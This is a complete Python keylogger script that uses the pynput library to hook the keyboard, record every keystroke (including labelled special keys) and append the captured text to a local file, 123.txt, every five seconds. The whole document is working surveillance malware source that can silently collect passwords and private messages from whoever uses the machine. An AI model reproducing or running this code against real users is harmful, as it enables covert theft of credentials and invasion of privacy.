import pynput.keyboard
import threading

keys = ''
def process_keys(key):
    global keys
    try:
        # to check the inputs are alphabets
        a =  str(key.char)
        if a == 'None':
            inpt = str(key)
            keys = keys + ' '+ 'Number(0 to 9)=>' + inpt
        else:
             keys = keys +  a 

            
    except AttributeError:
        
        # Special keys
        if key == key.enter:
            keys = keys + ' ' + 'ENTER' + ' '
        elif key == key.left:
            keys = keys + ' ' + 'LEFT_ARROW' + ' '
        elif key == key.left:
            keys = keys + ' ' + 'LEFT_ARROW' + ' '
        elif key == key.right:
            keys = keys + ' ' + 'RIGHT_ARROW' + ' '
        elif key == key.up:
            keys = keys + ' ' + 'UP_ARROW' + ' '
        elif key == key.down:
            keys = keys + ' ' + 'DOWN_ARROW' + ' '
        elif key == key.delete:
            keys = keys + ' ' + 'DELETEE' + ' '
        elif key == key.end:
            keys = keys + ' ' + 'END' + ' '
        elif key == key.esc:
            keys = keys + ' ' + 'ESC' + ' '
        elif key == key.tab:
            keys = keys + ' ' + 'TAB' + ' '
        elif key == key.caps_lock:
            keys = keys + ' ' + 'CAPS_LOCK' + ' '
        elif key == key.ctrl_l:
            keys = keys + ' ' + 'LEFT_CTRL' + ' '
        elif key == key.cmd:
            keys = keys + ' ' + 'Windows_command' + ' '
        elif key == key.alt_l:
            keys = keys + ' ' + 'Left_ALT' + ' '
        elif key == key.space:
            keys = keys + ' ' + 'Space' + ' '
        elif key == key.alt_gr:
            keys = keys + ' ' + 'Alt_gr' + ' '
        elif key == key.ctrl_r:
            keys = keys + ' ' + 'Right_ctrl' + ' '
        elif key == key.f1:
            keys = keys + ' ' + 'f1' + ' '
        elif key == key.f2:
            keys = keys + ' ' + 'f2' + ' '
        elif key == key.f3:
            keys = keys + ' ' + 'f3' + ' '
        elif key == key.f4:
            keys = keys + ' '+ 'f4' + ' '
        elif key == key.f5:
            keys = keys + ' '+ 'f5' + ' '
        elif key == key.f6:
            keys = keys + ' '+ 'f6' + ' '
        elif key == key.f7:
            keys = keys + ' '+ 'f7' + ' '
        elif key == key.f8:
            keys = keys + ' '+ 'f8' + ' '
        elif key == key.f9:
            keys = keys + ' '+ 'f9' + ' '
        elif key == key.f10:
            keys = keys + ' '+ 'f10' + ' '
        elif key == key.f11:
            keys = keys + ' '+ 'f11' + ' '
        elif key == key.f12:
            keys = keys + ' '+ 'f12' + ' '
        elif key == key.menu:
            keys = keys + ' '+ 'Menu' + ' '
        elif key == key.print_screen:
            keys = keys + ' '+ 'Print_screen' + ' '
        elif key == key.scroll_lock:
            keys = keys + ' '+ 'Scroll_lock' + ' '
        elif key == key.pause:
            keys = keys + ' '+ 'Pause' + ' '
        elif key == key.insert:
            keys = keys + ' '+ 'Insert' + ' '
        elif key == key.home:
            keys = keys + ' '+ 'Home' + ' '
        elif key == key.page_up:
            keys = keys + ' '+ 'Page_up' + ' '
        elif key == key.page_down:
            keys = keys + ' '+ 'page_down' + ' '
        elif key == key.backspace:
            keys = keys + ' '+ 'Backspace' + ' '
        elif key == key.shift_r:
            keys = keys + ' '+ 'Right_shift' + ' '
        elif key == key.num_lock:
            keys = keys + ' '+ 'Num_lock' + ' '
        else:
            print(1)
            keys = keys + ' '+ str(key)  + ' '  
            
        
        
   
    
def report():
    global keys
    print(keys)
    with open('123.txt','a') as writ:
        writ.write(keys + '\n')
    keys = ' '
    timer = threading.Timer(5, report)
    timer.start()
    
keyboard_listener = pynput.keyboard.Listener(on_press =  process_keys)
#report() or
with keyboard_listener as j:
    report()
    j.join()